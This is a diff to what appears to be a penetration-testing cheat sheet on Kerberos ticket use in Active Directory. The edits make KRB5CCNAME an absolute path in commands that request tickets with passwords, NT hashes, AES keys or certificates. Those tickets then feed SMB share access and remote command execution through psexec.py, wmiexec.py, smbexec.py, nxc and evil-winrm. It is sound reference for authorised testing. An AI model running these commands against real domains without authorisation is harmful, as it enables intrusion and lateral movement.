@@ -49,21 +49,23 @@ klist
 # kinit with a specific ccache path
 KRB5CCNAME=/tmp/$USER.ccache kinit $USER@$DOMAIN
 
-# getTGT.py: saves to a named file, set KRB5CCNAME after
+# getTGT.py: saves to a named file
+# KRB5CCNAME must be an absolute path — tools like smbclient.py and evil-winrm
+# read directly from the variable and will fail on relative paths
 getTGT.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP
-export KRB5CCNAME=$USER.ccache
+export KRB5CCNAME=$(pwd)/$USER.ccache
 
 # getTGT.py with NT hash (Pass-the-Key)
 getTGT.py $DOMAIN/$USER -hashes :$NTHASH -dc-ip $DC_IP
-export KRB5CCNAME=$USER.ccache
+export KRB5CCNAME=$(pwd)/$USER.ccache
 
 # getTGT.py with AES key
 getTGT.py $DOMAIN/$USER -aesKey $AES_KEY -dc-ip $DC_IP
-export KRB5CCNAME=$USER.ccache
+export KRB5CCNAME=$(pwd)/$USER.ccache
 
 # With certificate (PKINIT)
 certipy auth -pfx $USER.pfx -dc-ip $DC_IP -no-hash
-export KRB5CCNAME=$USER.ccache
+export KRB5CCNAME=$(pwd)/$USER.ccache
 
 # Verify and destroy
 klist
@@ -75,18 +77,18 @@ kdestroy
 ### SMB
 
 ```bash wrap
-# impacket smbclient
+# smbclient.py (impacket): reads KRB5CCNAME — must be an absolute path
+export KRB5CCNAME=/path/to/$USER.ccache
 smbclient.py -k -no-pass $DC_HOST
 
-# List shares then connect
+# Inside the prompt:
 # shares
 # use Finance
 # ls
 
-# Native smbclient
-smbclient -k //DC_HOST/Finance -c 'ls'
+# Native smbclient does NOT work in NTLM-disabled environments
 
-# nxc: use --use-kcache (reads KRB5CCNAME) + FQDN mandatory
+# nxc: --use-kcache reads KRB5CCNAME, FQDN mandatory (not IP)
 nxc smb $DC_HOST -k --use-kcache
 nxc smb $DC_HOST -k --use-kcache --shares
 nxc smb $DC_HOST -k --use-kcache -x "whoami"
@@ -103,9 +105,9 @@ psexec.py -k -no-pass $DOMAIN/$USER@$DC_HOST
 wmiexec.py -k -no-pass $DOMAIN/$USER@$DC_HOST
 smbexec.py -k -no-pass $DOMAIN/$USER@$DC_HOST
 
-# WinRM
+# WinRM: KRB5CCNAME must be set to an absolute path before running
+export KRB5CCNAME=/path/to/$USER.ccache
 evil-winrm -i $DC_HOST -r $DOMAIN
-# KRB5CCNAME must be set; evil-winrm picks it up automatically
 ```
 
 ### LDAP
